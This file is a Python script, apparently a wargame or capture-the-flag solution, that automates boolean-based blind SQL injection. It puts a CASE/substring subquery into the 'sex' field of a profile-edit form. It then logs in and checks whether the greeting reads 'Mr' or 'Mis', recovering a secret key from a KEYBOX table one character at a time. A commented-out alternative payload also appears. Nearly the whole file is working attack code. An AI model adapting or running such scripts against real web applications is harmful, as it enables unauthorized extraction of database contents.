import requests
from bs4 import BeautifulSoup as bs

edit_url  = 'aaaaaaaaa'
login_url = 'bbbbbbbbb'

edit_data = {
    "id"    : "duqrldudgns",
    "pw"    : "1234",
    "pwch"  : "1234",
    "age"   : "1",
    "sex"   : "",        # 1 : True / 2 : False
    "email" : "1"
}

login_data = {
    "id" : "duqrldudgns",
    "pw" : "1234"
}

path=""

with requests.Session() as s:

    for i in range(1,100):
        for injection in range(0x20,0x7F):
            
            #edit_data_sex parsing
            #edit_data['sex'] = "(select if(ascii(substring((select k3y from KEYBOX limit 1),{0},1))={1},1,2))".format(i,hex(injection)) ### find Replace  'select if'
            edit_data['sex'] = "CASE (substring((select k3y from KEYBOX limit 1),{0},1)) WHEN {1} THEN 1 ELSE 2 END".format(i,hex(injection))
            print(hex(injection)) 

            #do blind_injection 
            req = s.post(edit_url, data=edit_data)

            #check blind_injection      Mr = 1(True), Mis = 2(False)
            check = s.post(login_url, data=login_data)
            html = check.text

            #parsing Mr, Mis
            soup = bs(html, 'html.parser')
            text = soup.get_text()
            
            #find Mr, Mis
            if text.find("Mr")>0:
                path += chr(injection)
                print(path)
                break

            elif text.find("Mis")>0:
                # while all mis capture
                if injection == 0x7E: 
                    print("path is : ", path)        # Clear! blind Injection!!
                    quit()

'''True(sex : 1)
WELCOME~

>> Mr.duqrldudgns <<
'''

'''False(sex :2)
WELCOME~

>> Mis.duqrldudgns <<
'''